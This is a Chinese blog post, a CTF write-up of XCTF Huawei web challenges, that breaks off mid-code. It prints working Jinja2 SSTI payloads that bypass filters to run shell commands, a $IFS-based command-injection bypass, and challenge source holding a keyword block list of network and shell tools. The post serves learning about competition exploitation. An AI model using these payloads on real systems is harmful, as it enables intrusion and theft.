@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="[XCTF]华为第一场等我下午吃完饭去看题的时候，web差不多已经被师傅ak了，开始开心看题划水 webshell_1文件上传功能，传上去之后会发现后缀自动变jsp，需要传一个jsp的shell上去，但是好像有一定的过滤，完全不会jsp，网上搜的两个马都不能用，等会再说一开始好像队友直接传了个网上的马就打通了，但是后来写wp复现的时候又打不通了最后先上传了个读文件看了看waf，结果来了这么一句 U">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[XCTF]华为第一场">
+<meta property="og:url" content="https://blog.z3ratu1.cn/[XCTF]%E5%8D%8E%E4%B8%BA%E7%AC%AC%E4%B8%80%E5%9C%BA.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="[XCTF]华为第一场等我下午吃完饭去看题的时候，web差不多已经被师傅ak了，开始开心看题划水 webshell_1文件上传功能，传上去之后会发现后缀自动变jsp，需要传一个jsp的shell上去，但是好像有一定的过滤，完全不会jsp，网上搜的两个马都不能用，等会再说一开始好像队友直接传了个网上的马就打通了，但是后来写wp复现的时候又打不通了最后先上传了个读文件看了看waf，结果来了这么一句 U">
+<meta property="og:locale">
+<meta property="article:published_time" content="2020-12-20T05:05:30.000Z">
+<meta property="article:modified_time" content="2020-12-22T12:51:51.527Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="SSTI">
+<meta property="article:tag" content="shell">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/[XCTF]%E5%8D%8E%E4%B8%BA%E7%AC%AC%E4%B8%80%E5%9C%BA.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>[XCTF]华为第一场 | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/[XCTF]%E5%8D%8E%E4%B8%BA%E7%AC%AC%E4%B8%80%E5%9C%BA.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [XCTF]华为第一场
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-12-20 13:05:30" itemprop="dateCreated datePublished" datetime="2020-12-20T13:05:30+08:00">2020-12-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-12-22 20:51:51" itemprop="dateModified" datetime="2020-12-22T20:51:51+08:00">2020-12-22</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/%5BXCTF%5D%E5%8D%8E%E4%B8%BA%E7%AC%AC%E4%B8%80%E5%9C%BA.html" class="post-meta-item leancloud_visitors" data-flag-title="[XCTF]华为第一场" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/%5BXCTF%5D%E5%8D%8E%E4%B8%BA%E7%AC%AC%E4%B8%80%E5%9C%BA.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/%5BXCTF%5D%E5%8D%8E%E4%B8%BA%E7%AC%AC%E4%B8%80%E5%9C%BA.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="XCTF-华为第一场"><a href="#XCTF-华为第一场" class="headerlink" title="[XCTF]华为第一场"></a>[XCTF]华为第一场</h1><p>等我下午吃完饭去看题的时候，web差不多已经被师傅ak了，开始开心看题划水</p>
+<h2 id="webshell-1"><a href="#webshell-1" class="headerlink" title="webshell_1"></a>webshell_1</h2><p>文件上传功能，传上去之后会发现后缀自动变jsp，需要传一个jsp的shell上去，但是好像有一定的过滤，完全不会jsp，网上搜的两个马都不能用，等会再说<br>一开始好像队友直接传了个网上的马就打通了，但是后来写wp复现的时候又打不通了<br>最后先上传了个读文件看了看waf，结果来了这么一句<code> URLConnection connection = new URL(&quot;http://hids.normalbe.com:8765/upload/jsp&quot;).openConnection();</code>意思是waf还是在线找的接口？<br>然后重新构造打过去了（但是我还是不会）</p>
+<h2 id="mine1-1"><a href="#mine1-1" class="headerlink" title="mine1_1"></a>mine1_1</h2><p>简单扫雷游戏，先认真玩通关，会到一个success路由，有一个get参数msg，测一下ssti，1-1可变为0，过滤了<code>__&#39;&quot;[]</code>，不算多，不过感觉同时ban了下划线和方括号还挺难搞的<br>znj师傅使用了经典joiner操作配合request打通，request.args接受get参数，request.values接受post参数，request.cookies接受cookie<br>记一下payload</p>
+<pre class=" language-python"><code class="language-python">
+<span class="token punctuation">{</span><span class="token punctuation">{</span>joiner<span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>d<span class="token punctuation">)</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>d<span class="token punctuation">)</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>e<span class="token punctuation">)</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>f<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
+
+</code></pre>
+<p>attr()函数的作用是获取值，|就是管道符，这一串就等价于<code>joiner[request.cookies.a][xxxxx]...</code><br>然后在cookie里面填payload，完全不受过滤影响，想干什么干什么了<br>不过还是记一下完整payload，毕竟我对SSTI的认知还停留在抄payload阶段<br><code>joiner.__init__.__globals__.__builtins__.__getitem__.eval.__import__(&#39;os&#39;).popen(&#39;cat f*&#39;).read()</code></p>
+<h2 id="mine2"><a href="#mine2" class="headerlink" title="mine2"></a>mine2</h2><p>1的加强版，但是attr()|整个组合是真的无敌<br>attr里面的参数完全可以用字符串各种拼接绕过，使用超级格式化字符串绕过字符限制<br><code>(&quot;%c&quot;%(95))</code>这个样子取得下划线，95可以改成任意数字进行任意绕过，还能支持字符串加法拼接<br>还是也抄一下payload，虽然题是云的但是答案还是抄下来</p>
+<pre class=" language-python"><code class="language-python">
+<span class="token punctuation">{</span><span class="token operator">%</span><span class="token keyword">print</span><span class="token operator">%</span>0djoiner<span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token string">"init"</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token string">"lobals"</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token string">"etitem"</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">117</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token string">"iltins"</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token string">"etitem"</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token string">"impo"</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">114</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token string">"t"</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"popen"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">102</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span>
+
+</code></pre>
+<h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>看了venom的wp，他们直接使用\xff这种十六进制字符就直接绕了，不必项我们这么格式化字符串大费周章，不过还是都记一下</p>
+<h2 id="pyer"><a href="#pyer" class="headerlink" title="pyer"></a>pyer</h2><p>登录，密码那里测半天没反应，用户名那里输引号后500，用注释符之后恢复正常，万能密码登录失败<br>给人的感觉就是上次嘶吼的那个整数溢出注入，然后再把用户名密码进行一个写死的登录（试了下sleep()时间盲注，但是sleep用了就500，怀疑是没这个函数)</p>
+<h3 id="数据库类型判断"><a href="#数据库类型判断" class="headerlink" title="数据库类型判断"></a>数据库类型判断</h3><p>学一手新知识，如何判断数据库的类型<br>常见SQL也就MySQL，sqlite，pgsql，后面这几个应该也很多但是做题遇不到。。。mongodb、Access、MSsql(就是SQL server)</p>
+<h4 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h4><p>mysql能用#作为注释符，而sqlite则不行，#注释打不通但–打得通就必然不是MySQL</p>
+<h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>sqlite和pgsql的sleep函数都不直接叫sleep（sqlite好像没有sleep函数），mysql的sleep函数就叫sleep<br>还可以直接执行sqlite_version()看出不出问题直接确认是不是sqlite</p>
+<h4 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h4><p>pgsql不会自动进行类型转换，所以像<code>or &#39;1&#39;</code>这种语句就会直接报错，而不是转换成数字之后继续查询</p>
+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>发现了这点之后就是个整数溢出盲注，打穿了之后又是一个SSTI，云了，就看了一眼，好像注入和SSTI过滤都不严</p>
+<h2 id="cloud"><a href="#cloud" class="headerlink" title="cloud"></a>cloud</h2><p>队友扫目录发现了robots.txt<br>robots.txt里面有一个&#x2F;static&#x2F;.git&#x2F;目录访问无果，404，访问static目录403，但显示使用的是beego 1.12.2这个框架<br>翻了一遍全是静态，再扫一波，扫出来一个admin.html和admin路由，admin.html里面藏了一个发送到admin路由的登录表单，怎么还能扫出来一个phpinfo.php的呢。。。里面还是个PHP7的phpinfo<br>开始注入<br>注入结束，admin admin就能登进去，给了一份源码和一个路由<br>go源码不太会，下下来的这个文件居然可以改后缀为tar之后解压缩出来，不过里面的内容本身就是明文可以直接看，解压缩出来之后还是有条理一点，能看到一些整个看不到的文件，但是还是不会go</p>
+<h2 id="HIDS"><a href="#HIDS" class="headerlink" title="HIDS"></a>HIDS</h2><p>这个题是认真看的，学到一点东西</p>
+<p>直接命令执行，就是过滤了一万个字符<br>rmb神仙教会了我新操作，不知道过滤了什么字符的时候直接进行一个全字符的fuzz，看看有哪些能用再思考对策<br>fuzz结果为<code>&quot;$()0123456789;&gt;ABCDEFGHIJKLMNOPQRSTUVWXYZ\abcdefghijklmnopqrstuvwxyz</code><br>特殊字符仅有<code>$()\;&gt;</code><br>$(cmd)这种形式约等于反引号，$IFS作为占位符代替空格，<code>cd$IFS$(ls);cat$IFS$(ls$IFS$(ls))</code>可以拿到web目录下的app.py，源码</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token punctuation">,</span> request
+<span class="token keyword">import</span> subprocess<span class="token punctuation">,</span> re
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>
+
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/run'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    cmd <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token triple-quoted-string string">'''[^0-9a-zA-Z">\\\$();]'''</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">'Hacker!'</span>
+    <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token triple-quoted-string string">'''ping|wget|curl|bash|perl|python|php|kill|ps'''</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">'Hacker!'</span>
+    p <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> close_fds<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        <span class="token punctuation">(</span>msg<span class="token punctuation">,</span> errs<span class="token punctuation">)</span> <span class="token operator">=</span> p<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> msg
